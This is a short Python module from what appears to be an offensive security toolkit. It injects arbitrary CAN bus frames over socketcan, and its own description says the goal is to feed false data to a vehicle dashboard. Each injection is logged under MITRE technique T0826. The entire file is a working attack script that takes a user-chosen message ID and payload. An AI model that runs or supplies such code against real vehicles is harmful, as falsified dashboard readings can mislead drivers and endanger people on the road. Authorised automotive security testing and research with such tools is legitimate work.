#!/usr/bin/env python3
# modules/attacks/vehicle_dashboard_faker.py

import os
import argparse
import json
import time
from datetime import datetime
import can

LOG_FILE = "results/vehicle_dashboard_fake.json"
MITRE_TTP = "T0826"

def log_event(message_id, data_hex):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "message_id": hex(message_id),
            "data": data_hex,
            "ttp": MITRE_TTP
        }) + "\n")

def inject_fake_dashboard_message(interface, message_id, data):
    bus = can.interface.Bus(channel=interface, bustype='socketcan')
    msg = can.Message(arbitration_id=message_id, data=bytes.fromhex(data), is_extended_id=False)
    try:
        bus.send(msg)
        log_event(message_id, data)
        print(f"[✓] Injected CAN frame ID {hex(message_id)} with data {data}")
    except Exception as e:
        print(f"[!] Injection failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Inject false data into vehicle dashboard via CAN")
    parser.add_argument("--iface", default="can0", help="CAN interface (default: can0)")
    parser.add_argument("--id", type=lambda x: int(x,0), required=True, help="CAN message ID (e.g. 0x123)")
    parser.add_argument("--data", required=True, help="Hex payload (e.g. '01FF02A0')")
    args = parser.parse_args()

    inject_fake_dashboard_message(args.iface, args.id, args.data)
